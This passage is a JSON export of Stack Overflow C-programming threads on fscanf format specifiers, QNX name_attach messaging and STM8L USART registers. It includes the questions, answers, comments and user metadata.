"https://stackoverflow.com/users/8051589/andre-kampling"}, "edited": false, "score": 0, "creation_date": 1498032718, "post_id": 44670035, "comment_id": 76325139, "body": "@UnreasonableDirection: I compiled it, it works... It prints: <code>newcolumn2</code> because of your if statement..."}, {"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 0, "creation_date": 1498032876, "post_id": 44670035, "comment_id": 76325230, "body": "Are you sure your input file is at the directory root (<code>&#47;file.txt</code> vs <code>file.txt</code>). Always test the return value of many functions with prototype in <code>&lt;stdio.h&gt;</code>: <code>if (fff == NULL) { perror(&quot;file.txt&quot;); exit(EXIT_FAILURE); }</code>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1498033142, "post_id": 44670035, "comment_id": 76325405, "body": "how about &quot;man scanf&quot;? Google will find you the document, of course you have to read and understand it."}], "answers": [{"tags": [], "owner": {"reputation": 4827, "user_id": 8051589, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8VNG6.png?s=128&g=1", "display_name": "Andre Kampling", "link": "https://stackoverflow.com/users/8051589/andre-kampling"}, "is_accepted": false, "score": 0, "last_activity_date": 1498032916, "last_edit_date": 1498032916, "creation_date": 1498032567, "answer_id": 44670332, "question_id": 44670035, "link": "https://stackoverflow.com/questions/44670035/how-to-clone-99s-in-fscanffile-d-99s-id-name-2/44670332#44670332", "title": "How to clone &quot; %99s &quot; in : fscanf(file, &quot;%d %99s&quot;, &amp;id, name) == 2)", "body": "<p>It must be: <code>while (fscanf(fff, \"%d %99s %99s \", &amp;id, name, name2) == 3) { ... }</code>, note the <code>== 3</code>.\nFrom the <a href=\"https://www.freebsd.org/cgi/man.cgi?query=fscanf\" rel=\"nofollow noreferrer\">manpage of fscanf()</a>:</p>\n\n<blockquote>\n  <p>These functions return the number of input items successfully matched and assigned, which can be fewer than provided for, or even zero in the event of an early matching failure.</p>\n</blockquote>\n\n<p>Also note that your file is at the Linux root folder: <code>/file.txt</code>. Do you mean just <code>file.txt</code> for the current working directory?</p>\n\n<p>The <code>%99s</code> means, that fscanf will read 99 characters and add one terminating NUL character (<code>'\\0'</code>), so that your buffer will not overflow because it's size is 100.\nFurther if you want to provide always the right buffersize via <code>%s</code> to fscanf you can follow <a href=\"https://stackoverflow.com/a/1621973/8051589\">this explanation</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498053553, "post_id": 44670404, "comment_id": 76340562, "body": "Curious, why does this code add a trailing <code>&quot; &quot;</code> in <code>&quot;%d %99s %99s &quot;</code>?  With OP&#39;s and this code, I see no benefit nor need for the change."}], "tags": [], "owner": {"reputation": 640, "user_id": 7086962, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xIkMC.jpg?s=128&g=1", "display_name": "Chandrahas Aroori", "link": "https://stackoverflow.com/users/7086962/chandrahas-aroori"}, "is_accepted": true, "score": 0, "last_activity_date": 1498037203, "last_edit_date": 1498037203, "creation_date": 1498032793, "answer_id": 44670404, "question_id": 44670035, "link": "https://stackoverflow.com/questions/44670035/how-to-clone-99s-in-fscanffile-d-99s-id-name-2/44670404#44670404", "title": "How to clone &quot; %99s &quot; in : fscanf(file, &quot;%d %99s&quot;, &amp;id, name) == 2)", "body": "<p>The <code>%99s</code> means that the program must only accept <strong>upto 99 characters</strong> in name and name2.</p>\n\n<p>Now fscanf returns an int value of number of <strong>inputs accepted</strong> and placed into variables. So <code>fscanf(fff, \"%d %99s %99s\", &amp;id, name) == 2</code> is always wrong, as 3 inputs are accepted.</p>\n\n<p>The fscanf condtion is just a fail safe to be careful (common c idiom).</p>\n\n<p>The correct program now would be:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    char name[100];\n    char name2[100];\n    FILE *fff;\n    int found = 0;\n    int id;\n\n    fff = fopen(\"/file.txt\", \"r\");\n\n    if (fff == NULL)\n        return -1;\n\n    while ( fscanf(fff, \"%d %99s %99s \", &amp;id, name, name2) == 3 )\n    {\n        if (id == 2)\n        {\n            printf(\"%s\\n\", name2);\n            found = 1;\n            break;\n        }\n    }\n\n    fclose(fff);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8177431"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 832, "favorite_count": 0, "accepted_answer_id": 44670404, "answer_count": 2, "score": 0, "last_activity_date": 1498037203, "creation_date": 1498031702, "last_edit_date": 1498032349, "question_id": 44670035, "link": "https://stackoverflow.com/questions/44670035/how-to-clone-99s-in-fscanffile-d-99s-id-name-2", "title": "How to clone &quot; %99s &quot; in : fscanf(file, &quot;%d %99s&quot;, &amp;id, name) == 2)", "body": "<p><strong>test.c</strong> scans <strong>file.txt</strong> and prints name for a given id.<br>\nI would like to add a 3rd column to file.txt <br></p>\n\n<p>I also would like to ask:</p>\n\n<p>what does <code>%99s</code> and  <code>== 2</code> mean in:\n<code>while (fscanf(fff, \"%d %99s\", &amp;id, name) == 2) {</code></p>\n\n<p>file.txt ( new column added )</p>\n\n<pre><code>1 name1 newcolumn1\n2 name2 newcolumn2\n3 name3 newcolumn3\n</code></pre>\n\n<p>test.c modified to work with 3rd column ( added char name2[100]; and cloned %99s )</p>\n\n<p>Result: Not Working. ( compiles: ok. but outputs empty (nothing) )</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nmain() {\n    char name[100];\n    char name2[100];\n\n    FILE *fff;\n\n    int found = 0;\n    int id;\n\n    fff = fopen(\"/file.txt\", \"r\");\n\n    while (fscanf(fff, \"%d %99s %99s\", &amp;id, name, name2) == 2) {\n        if (id == 2) {\n            printf(\"%s\\n\", name2);\n            found = 1;\n            break;\n        }\n    }\n\n    fclose(fff);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "qnx", "qnx-neutrino"], "comments": [{"owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 0, "creation_date": 1498041294, "post_id": 44669719, "comment_id": 76331316, "body": "And is the <code>errno</code> value after <code>name_attach()</code> returned <code>NULL</code>?"}, {"owner": {"reputation": 175, "user_id": 6721498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/790535a17731cf62ce2033b787164581?s=128&d=identicon&r=PG&f=1", "display_name": "UjinUkr", "link": "https://stackoverflow.com/users/6721498/ujinukr"}, "reply_to_user": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 0, "creation_date": 1498049385, "post_id": 44669719, "comment_id": 76337217, "body": "@purplepsycho, what do you mean?"}, {"owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 1, "creation_date": 1498050349, "post_id": 44669719, "comment_id": 76338049, "body": "According to the <a href=\"http://www.qnx.com/developers/docs/6.5.0/index.jsp?topic=%2Fcom.qnx.doc.neutrino_lib_ref%2Fn%2Fname_attach.html\" rel=\"nofollow noreferrer\">documentation</a>, when <code>name_attach</code> fails, it set the variable <code>errno</code> to understand the error cause. Instead of <code>printf(&quot;prefix - null\\n&quot;);</code>, just write <code>printf(&quot;name_attach(): %d\\n&quot;, errno);</code>, or <code>perror(&quot;name_attach&quot;);</code>"}, {"owner": {"reputation": 175, "user_id": 6721498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/790535a17731cf62ce2033b787164581?s=128&d=identicon&r=PG&f=1", "display_name": "UjinUkr", "link": "https://stackoverflow.com/users/6721498/ujinukr"}, "reply_to_user": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 0, "creation_date": 1498052434, "post_id": 44669719, "comment_id": 76339783, "body": "Thanks, I fixed it"}, {"owner": {"reputation": 787, "user_id": 1263525, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eHKYB.jpg?s=128&g=1", "display_name": "Shaibal", "link": "https://stackoverflow.com/users/1263525/shaibal"}, "reply_to_user": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 0, "creation_date": 1498370892, "post_id": 44669719, "comment_id": 76468382, "body": "@UjinUkr Is your problem solved? If not, can you share the errno as suggested by @purplepsycho?"}], "owner": {"reputation": 175, "user_id": 6721498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/790535a17731cf62ce2033b787164581?s=128&d=identicon&r=PG&f=1", "display_name": "UjinUkr", "link": "https://stackoverflow.com/users/6721498/ujinukr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 102, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1498030746, "creation_date": 1498030746, "question_id": 44669719, "link": "https://stackoverflow.com/questions/44669719/qnx-message-prefix", "title": "Qnx message prefix", "body": "<p>I can not implement messaging between processes in QNX with the mechanism of the perfixes. I have tried many ways but all in vain.</p>\n\n<pre><code>       #define PREFIX_POSITION \"stat_pos\"\n\n        char receiveBuffer = 0;\n        char replyBuffer[25];\n        name_attach_t *positionPrefix;\n        dispatch_t *dpp;\n        int rcvid;\n\n        dpp = dispatch_create();\n\n        if (positionPrefix = name_attach(NULL, PREFIX_POSITION, 0) == NULL){\n            printf(\"prefix - null\\n\");\n            return EXIT_FAILURE;\n        }\n\n        positionPrefix = name_attach(dpp, PREFIX_POSITION, 0);\n\n        while(true){\n            rcvid = MsgReceive(positionPrefix-&gt;chid, &amp;receiveBuffer, sizeof(receiveBuffer), NULL);\n            switch(receiveBuffer){\n                case 'Q':\n                    //Do something\n                    break;\n                case 'H':\n                    //Do something\n                    break;\n                case 'D':\n                    //Do something\n                    break;\n                case 'S':\n                    //Do something\n                    break;\n            }\n            MsgReply(rcvid, REPLY_INDEX, &amp;replyBuffer, sizeof(replyBuffer));\n            receiveBuffer = 0;\n        }\n\n        return 0;\n    }\n</code></pre>\n\n<p><code>name_attach ()</code> function always returns null. What could be the problem?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1498031799, "post_id": 44669603, "comment_id": 76324591, "body": "Well, is that register do on a) read and b) write?   Where do you read it?  You read it with your debugger? Does any data get transmitted on theoutput pin when you scope it?  Note that we cannot get usefully involved with problems that involve hardware."}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "reply_to_user": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1498040927, "post_id": 44669603, "comment_id": 76331027, "body": "yeah I read it with my debugger. Where should I check the output?"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1498049911, "post_id": 44669603, "comment_id": 76337652, "body": "Please edit your question and fix the indention."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498053437, "post_id": 44669603, "comment_id": 76340483, "body": "&quot;I read it with my debugger&quot; does not read the value you wrote.  The register for writing and the one for reading are 2 different pieces of hardware.  They are not the same memory cell."}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498108796, "post_id": 44669603, "comment_id": 76364774, "body": "@chux So where can I read the value that I write?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498143419, "post_id": 44669603, "comment_id": 76388737, "body": "@ABHI You cannot - it is write-only."}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498193616, "post_id": 44669603, "comment_id": 76408981, "body": "@chux Should I use software like tera term , hyperterminal etc to obtain the output?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498521448, "post_id": 44669603, "comment_id": 76521471, "body": "@ABHI Observing the output on another view is one way.  Also consider a <a href=\"https://electronics.stackexchange.com/questions/86032/what-actually-is-a-shadow-register\">shadow register</a>"}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498560378, "post_id": 44669603, "comment_id": 76537114, "body": "@chux Thanks a lot for your help I managed to get it working properly"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498570438, "post_id": 44669603, "comment_id": 76543914, "body": "@ABHI Rather than &quot;thanks&quot; consider <a href=\"https://stackoverflow.com/help/someone-answers\">stackoverflow.com/help/someone-answers</a>"}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498627157, "post_id": 44669603, "comment_id": 76568836, "body": "@chux  I have not yet acquired the appropriate voting privileges :). I&#39;m trying to interface an lcd to my stm8 now and need a little bit of help. Where should I write the data that i want to display on the lcd? Is there a register analogous to the USART_DR register?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498650309, "post_id": 44669603, "comment_id": 76582751, "body": "@ABHI You have the <a href=\"https://stackoverflow.com/help/someone-answers\">right to accept an answer</a>.  Your <a href=\"https://stackoverflow.com/questions/44669603/usart-with-stm8l?noredirect=1#comment76568836_44669603\">comment</a> sounds like the basis for a new post - somewhere."}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498650347, "post_id": 44669603, "comment_id": 76582782, "body": "@chux I know about the right to accept the answer but the problem is 2 more people have commented in this section so I&#39;m not getting the &#39;check&#39; sign to accept the answer . Yeah I guess it would start a new post but I thought maybe you could solve it outright:)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498650515, "post_id": 44669603, "comment_id": 76582902, "body": "@ABHI I can answer it outright, but that is not what the comment section if for.  Review <a href=\"https://stackoverflow.com/help/privileges/comment\">When shouldn&#39;t I comment?</a>  Good luck"}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498652111, "post_id": 44669603, "comment_id": 76584177, "body": "@chux Kindly ,  do answer"}], "answers": [{"comments": [{"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "edited": false, "score": 0, "creation_date": 1498040868, "post_id": 44670597, "comment_id": 76330980, "body": "Sorry i didn&#39;t understand what you meant by &quot;why do you not read from that location what you wrote to it&quot;."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "edited": false, "score": 0, "creation_date": 1498045646, "post_id": 44670597, "comment_id": 76334345, "body": "@ABHI This answer described the reason for the behaviour you observe: if you write a value to the address USART_DR, then you really write to a different hardware register than if you read a value from address USART_DR. The last sentence is just a summary of that."}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "edited": false, "score": 0, "creation_date": 1498108742, "post_id": 44670597, "comment_id": 76364753, "body": "how can I rectify the problem or better still how do I access TDR and RDR separately?"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "edited": false, "score": 0, "creation_date": 1498175452, "post_id": 44670597, "comment_id": 76404843, "body": "@ABHI You can access TDR only for writing and RDR only for reading."}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "edited": false, "score": 0, "creation_date": 1498193513, "post_id": 44670597, "comment_id": 76408946, "body": "Okay but how do I do it? How can I check if the value I enter is being stored correctly? Should I check the output on Tera term , hyperterminal etc?"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "edited": false, "score": 0, "creation_date": 1498205274, "post_id": 44670597, "comment_id": 76414716, "body": "@ABHI Why should a store to a register fail? You can rely on it to succeed. To check, if the serial transmission works properly, you have to  listen on the serial interface anyway."}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "edited": false, "score": 0, "creation_date": 1498207908, "post_id": 44670597, "comment_id": 76416379, "body": "Could you please elaborate how will I listen on the serial interface"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "edited": false, "score": 0, "creation_date": 1498207978, "post_id": 44670597, "comment_id": 76416430, "body": "@ABHI You could either connect another interface on another device and listen there or you cross-connect rx and tx, then you can read the value back on the same device"}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "edited": false, "score": 0, "creation_date": 1498210484, "post_id": 44670597, "comment_id": 76418132, "body": "how about Tera term or hyperterminal? Can I use them for getting the output?"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "edited": false, "score": 0, "creation_date": 1498211033, "post_id": 44670597, "comment_id": 76418522, "body": "@ABHI If you interface the device correctly with your PC, yes, of course"}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "edited": false, "score": 0, "creation_date": 1498211421, "post_id": 44670597, "comment_id": 76418804, "body": "I tried it but I&#39;m getting only glitches and not a proper output."}, {"owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "edited": false, "score": 0, "creation_date": 1498560401, "post_id": 44670597, "comment_id": 76537127, "body": "Thanks a lot for your help I managed to get it working properly"}], "tags": [], "owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "is_accepted": false, "score": 2, "last_activity_date": 1498033368, "creation_date": 1498033368, "answer_id": 44670597, "question_id": 44669603, "link": "https://stackoverflow.com/questions/44669603/usart-with-stm8l/44670597#44670597", "title": "USART with stm8l", "body": "<p>The behaviour you observe is as expected:</p>\n\n<p>The <code>USART_DR</code> register is indeed <em>two</em> registers. One is used when you <em>write</em> to the memory location and takes the next character to transmit. The other one is used when <em>reading</em> from the memory location and contains the last character received.</p>\n\n<p><a href=\"https://i.stack.imgur.com/IWhrA.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/IWhrA.png\" alt=\"Architecture of USART_DR register\"></a></p>\n\n<p>This architecture was chosen to permit simultaneously sending and receiving from the USART and that is the reason, why you do not read back from that location what you wrote to it.</p>\n"}], "owner": {"reputation": 29, "user_id": 8148754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e71d53a83a307d1bf033a896f67957d7?s=128&d=identicon&r=PG&f=1", "display_name": "ABHI", "link": "https://stackoverflow.com/users/8148754/abhi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 310, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1498033368, "creation_date": 1498030468, "question_id": 44669603, "link": "https://stackoverflow.com/questions/44669603/usart-with-stm8l", "title": "USART with stm8l", "body": "<p>This is my code for using usart with stm8l. The main problem I am facing is that no matter what value I assign to the USART_DR register it always takes the value 0xff without even changing as I increment my char variable. Only the USART_SR register toggles between the values 0xc0 and 0xf0 which I suppose is correct.</p>\n\n<pre><code>clockinit(void) //16MHz internal clock enable\n{\n   CLK_SWR = 0x01;\n   CLK_ICKR = 0x01;\n   CLK_ECKR = 0x00;\n   CLK_DIVR = 0x00;\n   CLK_PCKENR1 = 0xFF;\n   CLK_PCKENR2 = 0xFF;\n}\nusartinit(void)  //usart initialisation \n{\nchar X;\nPC_DDR = 0x10;\nPC_CR1 = 0x10;\nX = USART1_SR;\nX = USART1_DR;\nUSART1_CR1 = 0x00;\nUSART1_CR2 = 0x0C;\nUSART1_CR3 = 0x0f;\nUSART1_CR4 = 0x03;\nUSART1_CR5 = 0x00;\nUSART1_GTR = 0x00;\nUSART1_PSCR = 0x00;\nUSART1_BRR2 = 0x0A;\nUSART1_BRR1 = 0x08;\n}\nvoid main()\n{\nchar *z = \"HELLO\";\nclockinit();\nusartinit();\nval = strlen(z);\nwhile (*z)\n{\n    USART1_DR = (unsigned char) *z;\n    while (USART1_SR_TXE == 0);\n    z++;                               \n}\n}\n</code></pre>\n"}, {"tags": ["c", "fractions", "greatest-common-divisor"], "comments": [{"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 3, "creation_date": 1498028063, "post_id": 